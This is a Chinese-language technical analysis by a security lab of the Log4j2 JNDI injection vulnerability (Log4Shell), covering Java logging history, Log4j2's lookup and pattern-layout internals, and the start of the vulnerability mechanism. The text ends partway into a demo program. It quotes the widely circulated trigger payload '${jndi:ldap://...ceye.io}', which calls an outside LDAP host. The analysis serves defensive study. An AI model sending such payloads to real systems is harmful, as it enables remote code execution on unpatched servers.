**作者：天融信阿尔法实验室  
原文链接：**
## 0x01前言
最近IT圈被爆出的log4j2漏洞闹的沸沸扬扬，log4j2作为一个优秀的java程序日志监控组件，被应用在了各种各样的衍生框架中，同时也是作为目前java全生态中的基础组件之一，这类组件一旦崩塌将造成不可估量的影响。从[Apache
Log4j2 漏洞影响面查询](https://log4j2.huoxian.cn/layout "Apache Log4j2
漏洞影响面查询")的统计来看，影响多达60644个开源软件，涉及相关版本软件包更是达到了321094个。而本次漏洞的触发方式简单，利用成本极低，可以说是一场java生态的‘浩劫’。本文将从零到一带你深入了解log4j2漏洞。知其所以然，方可深刻理解、有的放矢。
## 0x02 Java日志体系
要了解认识log4j2，就不得讲讲java的日志体系，在最早的2001年之前，java是不存在日志库的，打印日志均通过`System.out`和`System.err`来进行，缺点也显而易见，列举如下：
\- 大量IO操作； \- 无法合理控制输出，并且输出内容不能保存，需要盯守； \- 无法定制日志格式，不能细粒度显示；
在2001年，软件开发者`Ceki
Gulcu`设计出了一套日志库也就是log4j（注意这里没有2）。后来log4j成为了Apache的项目，作者也加入了Apache组织。这里有一个小插曲，Apache组织建议过sun在标准库中引入log4j，但是sun公司可能有自己的小心思，所以就拒绝了建议并在JDK1.4中推出了自己的借鉴版本JUL（Java
Util Logging）。不过功能还是不如Log4j强大。使用范围也很小。
由于出现了两个日志库，为了方便开发者进行选择使用，Apache推出了日志门面`JCL（Jakarta Commons
Logging）`。它提供了一个日志抽象层，在运行时动态的绑定日志实现组件来工作（如log4j、java.util.logging）。导入哪个就绑定哪个，不需要再修改配置。当然如果没导入的话他自己内部有一个Simple
logger的简单实现，但是功能很弱，直接忽略。架构如下图：
在2006年，log4j的作者`Ceki Gulcu` 离开了Apache组织后觉得JCL不好用，于是自己开发了一版和其功能相似的`Slf4j（Simple
Logging Facade for
Java）`。Slf4j需要使用桥接包来和日志实现组件建立关系。由于Slf4j每次使用都需要配合桥接包，作者又写出了`Logback`日志标准库作为Slf4j接口的默认实现。其实根本原因还是在于log4j此时无法满足要求了。以下是桥接架构图：
到了2012年，Apache可能看不要下去要被反超了，于是就推出了新项目`Log4j2`并且不兼容Log4j，又是全面借鉴`Slf4j+Logback`。不过此次的借鉴比较成功。
>
> Log4j2不仅仅具有Logback的所有特性，还做了分离设计，分为log4j-api和log4j-core，log4j-api是日志接口，log4j-core是日志标准库，并且Apache也为Log4j2提供了各种桥接包
到目前为止Java日志体系被划分为两大阵营，分别是Apache阵营和Cekij阵营。
## 0x03 Log4j2源码浅析
>
> Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX
> Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。
从上面的解释中我们可以看到Log4j2的功能十分强大，这里会简单分析其与漏洞相关联部分的源码实现，来更熟悉Log4j2的漏洞产生原因。
我们使用maven来引入相关组件的2.14.0版本，在工程的pom.xml下添加如下配置，他会导入两个jar包
            org.apache.logging.log4j
            log4j-core
            2.14.0
在工程目录resources下创建log4j2.xml
log4j2中包含两个关键组件`LogManager`和`LoggerContext`。`LogManager`是Log4J2启动的入口，可以初始化对应的`LoggerContext`。`LoggerContext`会对配置文件进行解析等其它操作。
在不使用slf4j的情况下常见的Log4J用法是从LogManager中获取Logger接口的一个实例，并调用该接口上的方法。运行下列代码查看打印结果
    import org.apache.logging.log4j.LogManager;
    import org.apache.logging.log4j.Logger;
    public class log4j2Rce2 {
        private static final Logger logger = LogManager.getLogger(log4j2Rce2.class);
        public static void main(String[] args) {
            String a="${java:os}";
            logger.error(a);
        }
    }
> 属性占位符之Interpolator插值器
log4j2中环境变量键值对被封装为了StrLookup对象。这些变量的值可以通过属性占位符来引用，格式为:`${prefix:key}`。在Interpolator插值器内部以Map的方式则封装了多个StrLookup对象，如下图显示：
详细信息可以查看[官方文档](https://logging.apache.org/log4j/2.x/manual/lookups.html
"log4j2 lookups")。这些实现类存在于`org.apache.logging.log4j.core.lookup`包下。
当参数占位符`${prefix:key}`带有prefix前缀时，Interpolator会从指定prefix对应的StrLookup实例中进行key查询。当参数占位符`${key}`没有prefix时，Interpolator则会从默认查找器中进行查询。如使用`${jndi:key}`时，将会调用`JndiLookup`的`lookup方法`
使用jndi(javax.naming)获取value。如下图演示。
> 模式布局
log4j2支持通过配置Layout打印格式化的指定形式日志，可以在Appenders的后面附加Layouts来完成这个功能。常用之一有`PatternLayout`，也就是我们在配置文件中`PatternLayout`字段所指定的属性`pattern`的值`%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n`。
`%msg`表示所输出的消息，其它格式化字符所表示的意义可以查看[官方文档](https://logging.apache.org/log4j/2.x/manual/layouts.html
"log4j2 layouts")。
`PatternLayout`模式布局会通过PatternProcessor模式解析器，对模式字符串进行解析，得到一个`List`转换器列表和`List`格式信息列表。在配置文件`PatternLayout`标签的`pattern`属性中我们可以看到类似%d的写法，d代表一个转换器名称，log4j2会通过`PluginManager`收集所有类别为Converter的插件,同时分析插件类上的@ConverterKeys注解,获取转换器名称,并建立名称到插件实例的映射关系，当PatternParser识别到转换器名称的时候,会查找映射。相关转换器名称注解和加载的插件实例如下图所示：
本次漏洞关键在于转换器名称`msg`对应的插件实例为`MessagePatternConverter`对于日志中的消息内容处理存在问题，这部分是攻击者可控的。`MessagePatternConverter`会将日志中的消息内容为`${prefix:key}`格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。
> 日志级别
log4j2支持种日志级别，通过日志级别我们可以将日志信息进行分类，在合适的地方输出对应的日志。哪些信息需要输出，哪些信息不需要输出，只需在一个日志输出控制文件中稍加修改即可。级别由高到低共分为6个：`fatal(致命的),
error, warn, info, debug, trace(堆栈)。`
log4j2还定义了一个内置的标准级别`intLevel`，由数值表示，级别越高数值越小。
当日志级别（调用）大于等于系统设置的`intLevel`的时候，log4j2才会启用日志打印。在存在配置文件的时候 ，会读取配置文件中``值设置`intLevel`。当然我们也可以通过`Configurator.setLevel("当前类名",
Level.INFO);`来手动设置。如果没有配置文件也没有指定则会默认使用Error级别，也就是200，如下图中的处理：
## 0x04 漏洞原理
首先先来看一下网络上流传最多的payload
    ${jndi:ldap://2lnhn2.ceye.io}
而触发漏洞的方法，大家都是以Logger.error()方法来进行演示，那这里我们也采用同样的方式来讲解，具体漏洞环境代码如下所示
    import org.apache.logging.log4j.Level;
    import org.apache.logging.log4j.LogManager;
    import org.apache.logging.log4j.Logger;
    import org.apache.logging.log4j.core.config.Configurator;